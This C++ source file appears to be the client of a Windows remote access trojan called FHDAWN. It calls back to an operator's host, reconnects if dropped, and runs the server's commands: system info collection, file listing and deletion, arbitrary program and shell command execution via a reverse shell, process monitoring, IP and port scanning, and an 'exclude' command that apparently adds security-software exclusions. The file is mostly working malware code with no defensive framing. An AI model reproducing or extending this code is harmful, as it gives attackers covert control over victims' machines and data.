#include "fhdawn.h"

// Wierd Recursion?
void FHDAWN::REConnect()
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(5000);
    MainConnect();
}

void FHDAWN::MainConnect()
{
    WSADATA wsa;
    int portno;
    std::istringstream(Port) >> portno;
    if(WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        std::cout << "WSA Startup Error : " << WSAGetLastError() << std::endl;
        exit(1);
    }

    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, 0);
    if(sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        std::cout << "Error : " << WSAGetLastError() << std::endl;
        exit(1);
    }

    server.sin_addr.s_addr = inet_addr(Host.c_str());
    server.sin_port = htons(portno);
    server.sin_family = AF_INET;

    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            REConnect();
        }
        else {
            connected = true;
        }
    } while (!connected); 

    fhdawn_main();
}


void FHDAWN::send_data(std::string data)
{
	// std::string final = XOR(data, KEY);
	int lerror = WSAGetLastError();
	int totalsent = 0;
	int buflen = strlen(data.c_str());
	while (buflen > totalsent) {
		int r = send(sockfd, data.c_str() + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = false;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

/*

Talk to the Server

*/
void FHDAWN::fhdawn_main()
{
    while(connected)
    {
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = false;
        }

        std::string strbuf(recvbuf); // Convert to String.
        
        if(
            strbuf == "osinfo"
        ) {
            ReverseShell("systeminfo");
        } else if ( strbuf == "ls" )
        {
            std::ostringstream files;
            std::ostringstream ftype;
            std::string strfiles;
            HANDLE hFind = FindFirstFile("*", &data);
            if(hFind != INVALID_HANDLE_VALUE){
                do{
                    ftype << data.cFileName;
                    if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
                         files << "\n[DIR] " << data.cFileName;
                    } else {
                        files << "\n[ + ] " << data.cFileName << " | Size : " << filesize(data.cFileName) << " bytes.";
                    }
                } while(FindNextFile(hFind, &data));

                strfiles = "\nFiles in '" + std::string(Dir()) + "'\n-----------------------\n" + files.str();
                send_data(strfiles.c_str());
            } else {
                send_data("Failed to get Files in directory.\n");
            }
        } else if ( strbuf.find("delete")  != std::string::npos)
        {
            // Receive filename to Delete.
            std::string file_s;
			char* filename[5]; // FILE:FILENAME
			memset(filename, '\0', 5);
			split(recvbuf, filename, ":");
			file_s = filename[1]; remove(file_s.c_str());
            send_data("File " + file_s + " deleted.");
        } 
        // Change working directory
        else if (strbuf == "cd" )
        {
            // gotta receive the directory name in an entirely different buffer.
            char dirbuf[BUFFER] = { 0 } ; std::ostringstream err;
            memset(dirbuf, '\0', BUFFER);
            int return_code = recv(sockfd, dirbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }

            if(SetCurrentDirectory(dirbuf) == 0)
            {
                // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setcurrentdirectory
                err << "Error [CHDIR] : " << GetLastError() << std::endl;
                send_data(err.str()); 
            } else {
                send_data("Changed Directory to : " + std::string(dirbuf));
            }
        }

        // Execute Files
        else if (strbuf == "exec" )
        {
             std::ostringstream err;
            memset(fbuf, '\0', BUFFER);
            int return_code = recv(sockfd, fbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }
            Execute(fbuf);
        } 

        // Execute with Command line arguments
        else if (strbuf.find("execargs") != std::string::npos)
        {
            char* argparse[5];
            memset(argparse, '\0', 5);
            split(recvbuf, argparse, ":"); // execargs:file.exe:myarguments [ execargs:cmd.exe:/c start notepad]
            ExecuteArgs(argparse[1], argparse[2]);
        }

        // Execute Command and send output to Server
        else if (strbuf == "cmd")
        {
             std::ostringstream err;
            memset(fbuf, '\0', BUFFER);
            int return_code = recv(sockfd, fbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }
            // std::string output = 
            // send_data(output);
            ReverseShell(fbuf);
        } 
        
        else if ( strbuf == "clientinfo" )
        {
            std::ostringstream cinfo;
            std::string myLocation = MyLocation();
            cinfo << "Client Path : " << myLocation << "\nFile Size : " << filesize(MyLocation().c_str()) << "\n";
            send_data(cinfo.str());
        }

        else if ( strbuf == "procmonitor")
        {
            
            memset(fbuf, '\0', BUFFER);
            int return_code = recv(sockfd, fbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }

            std::string proc (fbuf);
            ProcessMonitor(proc);            
        }
         else if (strbuf == "scanip")
        {
            
            memset(fbuf, '\0', BUFFER);
            int return_code = recv(sockfd, fbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }

            char *ipinfo[5];
            std::string ip_addr, strport;
            int port;
            memset(ipinfo, '\0', 5);
            split(fbuf, ipinfo, ",");
            ip_addr = ipinfo[0];
            strport = ipinfo[1];
            port = atoi(ipinfo[1]);
            send_data("Checking " + ip_addr + ":" + strport);
            checkPort(ip_addr.c_str(), port);
        } 

        else if (strbuf == "exclude")
        {
            memset(fbuf, '\0', BUFFER);
            int return_code = recv(sockfd, fbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }
            AddExclusion(fbuf);
        }

          else if (strbuf == "checkhost")
        {
            memset(fbuf, '\0', BUFFER);
            int return_code = recv(sockfd, fbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }
            CheckHost(fbuf);
        } else if ( strbuf == "gethostname")
        {
            memset(fbuf, '\0', BUFFER);
            int return_code = recv(sockfd, fbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }
            std::string response = std::string(fbuf) + " -> " + IP2Host(fbuf); 
            send_data(response);
        }
    }

    if(!connected)
    {
        MainConnect();
    }
}
